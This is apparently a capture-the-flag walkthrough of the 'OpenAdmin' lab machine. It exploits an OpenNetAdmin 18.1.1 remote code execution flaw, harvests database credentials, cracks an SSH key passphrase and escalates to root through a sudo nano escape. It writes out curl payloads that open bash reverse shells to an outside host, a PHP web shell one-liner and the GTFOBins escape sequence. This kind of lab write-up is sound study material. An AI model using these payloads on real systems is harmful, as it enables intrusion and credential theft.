1, Recon
port scan
	22/tcp ssh `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3`
	80/tcp http `Apache httpd 2.4.29`
Page check 
![](images/Pasted%20image%2020240920112604.png)
The index page is so original and looks like give us some hints about `Apache2 Ubuntu`

By enumerating the web-contents of this website
We have 2 useful options : `/artwork` and `/music`

For `/artwork`
![](images/Pasted%20image%2020240920113326.png)
There is nothing useful for us.

But for `/music`, the title is interesting `Music | NOT LIVE/NOT FOR PRODUCTION USE`
This means it is still in the testing stage.
![](images/Pasted%20image%2020240920113556.png)
There is a login page which we can access to.
![](images/Pasted%20image%2020240920113647.png)
In this place, we can find the version `version = v18.1.1`
And from the source code, we can get the name of service `OpenNetAdmin :: 0wn Your Network`
So we of course search its exploits.
`OpenNetAdmin 18.1.1 - Remote Code Execution`
`https://github.com/amriunix/ona-rce.git`
```
python3 ona-rce.py check http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!

python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Then we get the shell of www-data
```

Or we can manually exploit 
```
curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.65/443 0>%261'&xajaxargs[]=ping"  http
://10.10.10.171/ona/

or

use the exploit-db script 
shell.sh http://10.10.10.171/ona
bash -c 'bash -i >%26 /dev/tcp/10.10.14.65/443 0>%261'
```

Then we need to enumerate the config file and find some valid credit.
From `config/config.inc.php`
```
/* Include Files: Functions */
    "inc_functions"          => "$include/functions_general.inc.php",
    "inc_functions_gui"      => "$include/functions_gui.inc.php",
    "inc_functions_db"       => "$include/functions_db.inc.php",
    "inc_functions_auth"     => "$include/functions_auth.inc.php",
    "inc_db_sessions"        => "$include/adodb_sessions.inc.php",
    "inc_adodb"              => "$include/adodb/adodb.inc.php",
    "inc_adodb_xml"          => "$include/adodb/adodb-xmlschema03.inc.php",
    "inc_xajax_stuff"        => "$include/xajax_setup.inc.php",
    "inc_diff"               => "$include/DifferenceEngine.php",
```

So let's continue enumerating file path `include/`, but very sad, I can not find anything useful for us.
Then we can enumerate the other files and finally I found other config
`/var/www/html/ona/local/config/database_settings.inc.php`
```
ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
There is two users in `/home`:
`jimmy` and `joanna`
Let's try to use this password to login them.
We successfully login as jimmy and we can get the group id
```
id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```
Then we can access to `/var/www/internal`
There is a `main.php`:
```
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
That means if we can open this service, then we can get the `id_rsa` of joanna.

Then we can check where is  this service :
```
jimmy@openadmin:/etc/apache2/sites-enabled$ ls

internal.conf  openadmin.conf

internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
In this place we need to use the Port forwarding and we can get the login page.

![](images/Pasted%20image%2020240920121624.png)

From `/index.php`
```
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')
```
We find there is only one valid user `jimmy` and maybe the password is as usual.
But very sadly, we need to crack the password or just change the source code.
By using `CrackStation`, we easily get the password `Revealed`
![](images/Pasted%20image%2020240920122430.png)


Decrypt Key
To decrypt the key, the first thing I tried was jimmy’s password, n1nj4W4rri0R!, but that fails:
```
openssl rsa -in id_rsa -out id_rsa_openadmin_joanna 
Enter pass phrase for id_rsa:
Could not find private key from id_rsa
806B4FBAFFFF0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:
806B4FBAFFFF0000:error:04800065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:472:
```

Then I figured I’d try “ninja” words from rockyou. First create the wordlist:
`grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja`

Then it breaks in john instantly:
```
ssh2john id_rsa > hash

john --wordlist=rockyou_ninja hash  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas     (id_rsa)     
1g 0:00:00:00 DONE (2024-09-20 12:27) 100.0g/s 150400p/s 150400c/s 150400C/s bninja95..badassninja
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`bloodninjas` is the password of this `rsa id_rsa` 
Then we can login successfully by ssh key.

In other path, we can just write a reverse shell into the `/var/www/internal`
because jimmy has the right to write into this directory.
`drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal`

```
Firstly make a web shell
echo '<?php system($_GET["wither"]); ?>' > wither.php

Then use the web shell to handle a reverse shell

http://localhost:52846/wither.php?wither=id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)

curl 'http://127.0.0.1:52846/wither.php?wither=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.65/443%200%3E%261%27'
```
Then we can get the reverse shell
![](images/Pasted%20image%2020240920123507.png)

3, shell as root
When we shell as `joanna`, we can check `sudo -l`
```
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

`-rw-r--r-- 1 root root 0 Nov 22  2019 /opt/priv
From `GTFOBins` there is a tricky exploit
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo nano
^R^X
reset; sh 1>&0 2>&0
```
Then we can get the root shell.

Beyond the root:
I really want to try the sudo exploit in this version
```
sudo --version
Sudo version 1.9.7p1
Sudoers policy plugin version 1.9.7p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.7p1
Sudoers audit plugin version 1.9.7p1
```
In this place, It doesn't seem that this user can run sudoedit as root.
So `sudo 1.8.0 to 1.9.12p1 - Privilege Escalation` seems did not work.
